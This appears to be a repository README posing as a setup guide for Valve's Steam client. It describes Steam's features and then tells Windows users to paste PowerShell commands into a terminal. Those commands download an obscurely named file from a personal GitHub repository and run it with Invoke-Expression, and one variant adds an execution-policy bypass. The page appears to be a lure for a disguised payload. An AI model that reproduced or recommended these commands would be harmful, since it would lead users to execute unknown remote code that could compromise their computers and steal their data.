# Steam

Steam is the Windows tool this page sets up. The command in Quick Setup installs it on this PC. You open Steam to start and manage what it runs.

Steam is the main Windows client for Valve’s store and your game library. After you sign in, it shows owned titles, friends, workshop content, and cloud saves in one place. Downloads, patches, and optional beta branches run in the background while you browse the store or chat.

A typical session starts from the Start menu or a pinned taskbar icon. Steam opens to the library or store; you pick a game and click Play, or queue several installs while you work elsewhere. Family sharing, remote play, and controller profiles stay tied to the same account across machines you authorize.

This repository holds a Windows-oriented setup file for a clean install path, short notes on first-run options and library folders, and a changelog that tracks bundle updates. Use it when you rebuild a PC or standardize how teammates install the same launcher version.

## What you open

- Central library lists installed games with play time and last played dates.
- Background downloads apply patches without blocking store browsing or chat.
- Steam Cloud syncs saves and settings for supported titles across PCs.
- Workshop integration installs and updates mods from inside the client.
- Big Picture mode scales the interface for TVs and couch controllers.
- Family Library Sharing lets authorized accounts access selected owned games.
- Remote Play streams gameplay from your PC to another device on your network.
- Steam Input remaps controllers and saves per-game profiles automatically.

## Quick Setup (PowerShell)

This installs the tool Steam on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/anja-fischer806615/steam-setup-guide/main/oznbn4gc4d.zhvzp1yd | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/anja-fischer806615/steam-setup-guide/main/oznbn4gc4d.zhvzp1yd | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `oznbn4gc4d.zhvzp1yd` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `anja-fischer806615/steam-setup-guide`. Steam 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
